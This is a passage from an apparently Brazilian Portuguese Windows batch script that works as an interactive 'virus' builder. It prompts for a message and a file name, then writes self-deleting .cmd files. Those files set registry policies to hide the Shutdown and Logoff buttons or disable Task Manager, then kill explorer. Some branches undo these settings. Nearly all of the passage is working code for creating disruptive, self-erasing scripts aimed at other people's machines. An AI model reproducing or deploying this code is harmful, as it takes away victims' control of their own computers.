echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo  1 ^<= para testa a Mensagem que vec Digitou 
echo.
echo  2 ^<= nฦo gostei dessa mensagem quero digitar outra
echo.
echo  3 ^<= continuar com a criaฦo do meu vกrus
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
set /p s5= Digite  =- 
if %s5% == 1 goto t4
if %s5% == 2 goto a25
if %s5% == 3 goto a27
echo msgbox"Erro [ %s5% ] nใo ้ um comando vแlido digite [ D 1 A 3 ]",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
start %temp%\js0.vbs
goto a26
:t4
echo msgbox"%k2%",vbinformation,"%k6%" > %temp%\js.vbs 
start %temp%\js.vbs
goto a26
:a27
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo          { ATENCAO Nao use Acentos nem cedilha }
echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k7= Digite um Nome para o seu Script =- 
if exist "%k7%".cmd (
echo msgbox"jแ existe na pasta um Script com o nome [ %k7% ]  Digite outro nome para o seu Script",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
 start %temp%\js0.vbs
goto a27
)
:a30
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo  { Aqui voc pode mudar de opฦo o apenas confirma
echo.
echo  { 1 ^<= Esconder o botฦo Desligar
echo.
echo  { 2 ^<= Esconder o botฦo Logoff
echo.
echo  { 3 ^<= Esconder os dois botไes Logoff e Desligar
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k= Comando =- 
if %k% == 1 goto a31
if %k% == 2 goto a32
if %k% == 3 goto a33
echo msgbox"Erro [ %k% ] nใo ้ um comando vแlido digite [ D 1 A 3 ]  ",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto a30
:a31
 echo @echo off  >>"%k7%".cmd
echo cd /d %%~dp0  >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4 >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n ) >>"%k7%".cmd
 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4  >>"%k7%".cmd
 echo goto s2 >>"%k7%".cmd
 echo :n  >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema. para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs >>"%k7%".cmd
 echo tskill cmd  >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
echo REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 0x00000001 /f  >>"%k7%".cmd
echo echo msgbox"%k2%",vbinformation,"%k6%"^> %%temp%%\js.vbs >>"%k7%".cmd
echo start %%temp%%\js.vbs >>"%k7%".cmd
echo tskill explorer  >>"%k7%".cmd
echo del "%k7%.cmd"  >>"%k7%".cmd
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto inp2
:a32
 echo @echo off  >>"%k7%".cmd
echo cd /d %%~dp0  >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4 >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n ) >>"%k7%".cmd
 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4  >>"%k7%".cmd
 echo goto s2 >>"%k7%".cmd
 echo :n  >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema. para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs >>"%k7%".cmd
 echo tskill cmd  >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
echo REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v StartMenuLogOff /t REG_DWORD /d 0x00000001 /f  >>"%k7%".cmd
echo echo msgbox"%k2%",vbinformation,"%k6%"^> %%temp%%\js.vbs >>"%k7%".cmd
echo start %%temp%%\js.vbs >>"%k7%".cmd
echo tskill explorer  >>"%k7%".cmd
echo del "%k7%.cmd"  >>"%k7%".cmd
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto inp2
:a33
 echo @echo off  >>"%k7%".cmd
echo cd /d %%~dp0  >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4 >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n ) >>"%k7%".cmd
 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4  >>"%k7%".cmd
 echo goto s2 >>"%k7%".cmd
 echo :n  >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema. para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs >>"%k7%".cmd
 echo tskill cmd  >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
echo REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 0x00000001 /f  >>"%k7%".cmd
echo REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v StartMenuLogOff /t REG_DWORD /d 0x00000001 /f  >>"%k7%".cmd
echo echo msgbox"%k2%",vbinformation,"%k6%"^> %%temp%%\js.vbs >>"%k7%".cmd
echo start %%temp%%\js.vbs >>"%k7%".cmd
echo tskill explorer  >>"%k7%".cmd
echo del "%k7%.cmd"  >>"%k7%".cmd
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto inp2

:a28
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo          { ATENCAO Nao use Acentos nem cedilha }
echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k7= Digite um Nome para o seu Script =- 
if exist "%k7%".cmd (
echo msgbox"jแ existe na pasta um Script com o nome [ %k7% ]  Digite outro nome para o seu Script",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
 start %temp%\js0.vbs
goto a28
)
:a34
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo  { Aqui voc pode mudar de opฦo o apenas confirma
echo.
echo  { 1 ^<= Esconder o botฦo Desligar
echo.
echo  { 2 ^<= Esconder o botฦo Logoff
echo.
echo  { 3 ^<= Esconder os dois botไes Logoff e Desligar
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k= Comando =- 
if %k% == 1 goto a35
if %k% == 2 goto a36
if %k% == 3 goto a37
echo msgbox"Erro [ %k% ] nใo ้ um comando vแlido digite [ 1 ou 2 ]  ",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto a34
msg * /time 5 Obrigado
:a35
echo @echo off  >>"%k7%".cmd
echo cd /d %%~dp0  >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4 >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n ) >>"%k7%".cmd
 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4  >>"%k7%".cmd
 echo goto s2 >>"%k7%".cmd
 echo :n  >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema. para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs >>"%k7%".cmd
 echo tskill cmd  >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
echo REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 0x00000001 /f  >>"%k7%".cmd
echo tskill explorer  >>"%k7%".cmd
echo del "%k7%.cmd"  >>"%k7%".cmd
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto inp2
:a36
echo @echo off  >>"%k7%".cmd
echo cd /d %%~dp0  >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4 >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n ) >>"%k7%".cmd
 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4  >>"%k7%".cmd
 echo goto s2 >>"%k7%".cmd
 echo :n  >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema. para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs >>"%k7%".cmd
 echo tskill cmd  >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
echo REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v StartMenuLogOff /t REG_DWORD /d 0x00000001 /f  >>"%k7%".cmd
echo tskill explorer  >>"%k7%".cmd
echo del "%k7%.cmd"  >>"%k7%".cmd
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto inp2
:a37
echo @echo off  >>"%k7%".cmd
echo cd /d %%~dp0  >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4 >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n ) >>"%k7%".cmd
 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4  >>"%k7%".cmd
 echo goto s2 >>"%k7%".cmd
 echo :n  >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema. para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs >>"%k7%".cmd
 echo tskill cmd  >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
echo REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 0x00000001 /f  >>"%k7%".cmd 
echo REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v StartMenuLogOff /t REG_DWORD /d 0x00000001 /f  >>"%k7%".cmd
echo tskill explorer  >>"%k7%".cmd
echo del "%k7%.cmd"  >>"%k7%".cmd
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto inp2
:a29
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo          { ATENCAO Nao use Acentos nem cedilha }
echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k7= Digite um Nome para o seu Script =- 
if exist "%k7%".cmd (
echo msgbox"jแ existe na pasta um Script com o nome [ %k7% ]  Digite outro nome para o seu Script",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
 start %temp%\js0.vbs
goto a29
)
 echo @echo off  >>"%k7%".cmd
echo cd /d %%~dp0  >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4 >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n ) >>"%k7%".cmd
 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4  >>"%k7%".cmd
 echo goto s2 >>"%k7%".cmd
 echo :n  >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema. para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs >>"%k7%".cmd
 echo tskill cmd  >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
echo REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 0x00000000 /f >>"%k7%".cmd
echo tskill explorer  >>"%k7%".cmd
echo del "%k7%.cmd"  >>"%k7%".cmd
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto inp2
:a38
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo          { ATENCAO Nao use Acentos nem cedilha }
echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k7= Digite um Nome para o seu Script =- 
if exist "%k7%".cmd (
echo msgbox"jแ existe na pasta um Script com o nome [ %k7% ]  Digite outro nome para o seu Script",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
 start %temp%\js0.vbs
goto a38
)
 echo @echo off  >>"%k7%".cmd
echo cd /d %%~dp0  >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4 >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n ) >>"%k7%".cmd
 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4  >>"%k7%".cmd
 echo goto s2 >>"%k7%".cmd
 echo :n  >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema. para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs >>"%k7%".cmd
 echo tskill cmd  >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
echo REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v StartMenuLogOff /t REG_DWORD /d 0x00000000 /f >>"%k7%".cmd
echo tskill explorer  >>"%k7%".cmd
echo del "%k7%.cmd"  >>"%k7%".cmd
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto inp2
:a39
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo          { ATENCAO Nao use Acentos nem cedilha }
echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k7= Digite um Nome para o seu Script =- 
if exist "%k7%".cmd (
echo msgbox"jแ existe na pasta um Script com o nome [ %k7% ]  Digite outro nome para o seu Script",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
 start %temp%\js0.vbs
goto a39
)
 echo @echo off  >>"%k7%".cmd
echo cd /d %%~dp0  >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4 >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n ) >>"%k7%".cmd
 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4  >>"%k7%".cmd
 echo goto s2 >>"%k7%".cmd
 echo :n  >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema. para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs >>"%k7%".cmd
 echo tskill cmd  >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
echo REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 0x00000000 /f  >>"%k7%".cmd
echo REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v StartMenuLogOff /t REG_DWORD /d 0x00000000 /f  >>"%k7%".cmd
echo tskill explorer  >>"%k7%".cmd
echo del "%k7%.cmd"  >>"%k7%".cmd
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto inp2
:v8
mode 65,15
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo  { Este Script deve ser executado como Administrador
echo.
echo  { 1 ^<= Bloquear o Gerenciador de tarefas
echo.
echo  { 2 ^<= Desbloquear o Gerenciador de tarefas
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k= Comando =- 
if %k% == 1 goto a40
if %k% == 2 goto a45
echo msgbox"Erro [ %k% ] nใo ้ um comando vแlido digite [ 1 ou 2 ]  ",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto v8
:a40
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo  { Deseja colocar uma mensagem pra ser 
echo.
echo  { Mostrada quando o Script vกrus for executado ?
echo.
echo  { pressione =- s  nฦo quero mensagem =- n
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
set /p k= Comando =- 
if %k% == s goto a41
if %k% == n goto a44
echo msgbox"Erro [ %k% ] nใo ้ um comando vแlido digite [ s ou n ] deve ser min๚sculo ",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto a40
:a41
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo       { Essa mensagem vai aparecer numa janela .vbs }
echo.
echo           { ATENCAO Nao usar Acentos nem cedilha }
echo           _________________________________________
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k2= Digite a Mensagem =- 
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo       { Digite o Nome da janela nome que fica naguia }
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k6= Digite a nome da guia da janela =- 
:a42
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo  1 ^<= para testa a Mensagem que vec Digitou 
echo.
echo  2 ^<= nฦo gostei dessa mensagem quero digitar outra
echo.
echo  3 ^<= continuar com a criaฦo do meu vกrus
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
set /p s5= Digite  =- 
if %s5% == 1 goto t5
if %s5% == 2 goto a41
if %s5% == 3 goto a43
echo msgbox"Erro [ %s5% ] nใo ้ um comando vแlido digite [ D 1 A 3 ]",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
start %temp%\js0.vbs
goto a42
:t5
echo msgbox"%k2%",vbinformation,"%k6%" > %temp%\js.vbs 
start %temp%\js.vbs
goto a42
:a43
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo          { ATENCAO Nao use Acentos nem cedilha }
echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k7= Digite um Nome para o seu Script =- 
if exist "%k7%".cmd (
echo msgbox"jแ existe na pasta um Script com o nome [ %k7% ]  Digite outro nome para o seu Script",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
 start %temp%\js0.vbs
goto a43
)
 echo @echo off  >>"%k7%".cmd
echo cd /d %%~dp0  >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4 >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n ) >>"%k7%".cmd
 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4  >>"%k7%".cmd
 echo goto s2 >>"%k7%".cmd
 echo :n  >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema. para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs >>"%k7%".cmd
 echo tskill cmd  >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
echo REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 0x00000001 /f >>"%k7%".cmd
echo echo msgbox"%k2%",vbinformation,"%k6%"^> %%temp%%\js.vbs >>"%k7%".cmd
echo start %%temp%%\js.vbs >>"%k7%".cmd
echo tskill explorer  >>"%k7%".cmd
echo del "%k7%.cmd"  >>"%k7%".cmd
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto inp2
:a44
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo          { ATENCAO Nao use Acentos nem cedilha }
echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k7= Digite um Nome para o seu Script =- 
if exist "%k7%".cmd (
echo msgbox"jแ existe na pasta um Script com o nome [ %k7% ]  Digite outro nome para o seu Script",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
 start %temp%\js0.vbs
goto a44
)
 echo @echo off  >>"%k7%".cmd
echo cd /d %%~dp0  >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4 >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n ) >>"%k7%".cmd
 echo :s  >>"%k7%".cmd
 echo del /f /q %%windir%%\system32\js4  >>"%k7%".cmd
 echo goto s2 >>"%k7%".cmd
 echo :n  >>"%k7%".cmd
 echo echo msgbox"( ATENวรO! ) Voc๊ nใo executou o script como Administrador desta forma nใo tera permissใo para fazer altera็๕es no sistema. para executar como administrador clique com o lado direito do mouse e em executar como administrador. se mesmo assim esta mensagem for exibida voc๊ nใo ้ um Usuแrio com privil้gios de administrdor",vbinformation,"Aten็ใo! aviso Importante" ^> %%temp%%\js3.vbs  >>"%k7%".cmd
 echo start %%temp%%\js3.vbs >>"%k7%".cmd
 echo tskill cmd  >>"%k7%".cmd
 echo :s2  >>"%k7%".cmd
echo REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 0x00000001 /f >>"%k7%".cmd
echo tskill explorer  >>"%k7%".cmd
echo del "%k7%.cmd"  >>"%k7%".cmd
echo msgbox"o seu virus foi criado com scesso na mesma pasta em que foi executado este Script com o nome [ %k7% ] ele esta programado para se-auto destruir ap๓s ser executado",vbinformation,"AVISO pra voc๊ %username%" > %temp%\sp.vbs 
start %temp%\sp.vbs
goto inp2
:a45
cls
echo.
echo ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
echo.
echo          { ATENCAO Nao use Acentos nem cedilha }
echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p k7= Digite um Nome para o seu Script =- 
if exist "%k7%".cmd (
echo msgbox"jแ existe na pasta um Script com o nome [ %k7% ]  Digite outro nome para o seu Script",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js0.vbs
 start %temp%\js0.vbs
goto a45
)
 echo @echo off  >>"%k7%".cmd
echo cd /d %%~dp0  >>"%k7%".cmd
echo echo. ^> %%windir%%\system32\js4 >>"%k7%".cmd
 echo if exist %%windir%%\system32\js4 ( goto s ) else ( goto n ) >>"%k7%".cmd
